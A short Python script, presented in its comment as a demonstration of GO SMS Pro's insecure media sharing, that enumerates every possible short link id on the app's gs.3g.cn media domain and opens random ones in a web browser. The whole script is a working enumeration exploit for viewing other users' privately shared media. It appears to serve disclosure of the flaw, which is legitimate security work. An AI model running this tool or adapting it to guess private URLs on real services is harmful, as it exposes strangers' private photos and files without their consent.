# this script is to demonstrate how insecure
# GO SMS PRO is in their way to share media
# in their platform

import os
from sys import argv
from string import digits
from random import choice
from itertools import permutations
from string import ascii_lowercase as letters


class goSmsPro:
    def __init__(self):
        self.all_ids = self.generator()
        self.start_command = "start" if os.name == "nt" else "xdg-open"

    def generator(self):
        """
        method to generate all the possibile links with len 4-6
        """
        # for now seems that only the first 6 alphabetical
        # letters can be included in a go sms pro link id
        possible_chars = letters[:6] + digits
        temp = []
        for num in range(4, 7):
            for element in permutations(possible_chars, num):
                temp.append(f"http://gs.3g.cn/D/{''.join(element)}/a")
        return temp

    def open_random_link(self):
        """
        method to open a generated
        link in a web browser
        """
        link = choice(self.all_ids)
        print(f"Link generated -> {link}")
        os.popen(f"{self.start_command} {link}")

    def open_links_loop(self):
        """
        method to loop until KeyboardInterrupt exception,
        opens new links in a browser every enter key
        """
        try:
            while True:
                self.open_random_link()
                input("\nPress enter to generate a new link.\n")
        except KeyboardInterrupt:
            quit()

    def open_links_number(self, num):
        """
        method to open a specific number of links in a browser
        """
        for i in range(num):
            self.open_random_link()


def main():

    if len(argv) == 2:
        if not argv[1].isnumeric():
            print("Second argument must be a number.")
            quit()
        goSmsPro().open_links_number(int(argv[1]))
    else:
        goSmsPro().open_links_loop()


if __name__ == "__main__":
    main()
